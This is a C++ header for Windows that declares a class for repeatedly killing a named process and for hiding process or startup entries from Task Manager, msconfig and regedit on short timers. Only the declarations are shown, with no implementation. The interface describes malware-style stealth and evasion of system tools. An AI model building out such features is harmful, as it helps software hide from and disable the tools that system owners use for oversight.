#include <windows.h>
#include <tchar.h>
#include <commctrl.h>

#define ERR_PROCESSID 0

#define PROCESS_TASK_MANAGER_NAME   "taskmgr.exe"
#define PROCESS_MSCONFIG_NAME       "msconfig.exe"
#define PROCESS_REGEDIT_NAME        "regedit.exe"

#define DEFAULT_INTERVAL_KILL       125
#define DEFAULT_INTERVAL_HIDE       25

#pragma once

class Process {
   private:
      char * processName;
      char * patternMSConfig;
      char * patternRegedit;
      unsigned long PID;
      
      unsigned long msecDelayKill;
      unsigned long msecDelayHideTaskManager;
      unsigned long msecDelayHideMSConfig;
      unsigned long msecDelayHideRegedit;
           
      bool quitKillProcessThread;
      bool quitHideProcessTaskManagerThread;
      bool quitHideProcessMSConfigThread;
      bool quitHideProcessRegeditThread;
            
   public:
      Process(const char * procName, char * patternToHideMSConfig = NULL, char * patternToHideRegedit = NULL);
      bool killProcess();
      bool killPermanentProcess(unsigned long msecIntervalKill = DEFAULT_INTERVAL_KILL);
      bool hideProcessTaskManager();
      bool hidePermanentProcessTaskManager(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
      bool hideProcessMSConfig();
      bool hidePermanentProcessMSConfig(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
      bool hideProcessRegedit();
      bool hidePermanentProcessRegedit(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
      
      void setTerminateKillProcessThread(bool value);
      void setTerminateHideProcessTaskManagerThread(bool value);
      void setTerminateHideProcessMSConfigThread(bool value);
      void setTerminateHideProcessRegeditThread(bool value);
            
      bool terminateKillProcessThread() { return quitKillProcessThread; }
      bool terminateHideProcessTaskManagerThread() { return quitHideProcessTaskManagerThread; }
      bool terminateHideProcessMSConfigThread() { return quitHideProcessMSConfigThread; }
      bool terminateHideProcessRegeditThread() { return quitHideProcessRegeditThread; }
            
      unsigned long getIntervalKill() { return msecDelayKill; }
      unsigned long getIntervalTaskManagerHide() { return msecDelayHideTaskManager; } 
      unsigned long getIntervalMSConfigHide() { return msecDelayHideMSConfig; } 
      unsigned long getIntervalRegeditHide() { return msecDelayHideRegedit; }
      char * getProcessName();
      unsigned long getPID();
};
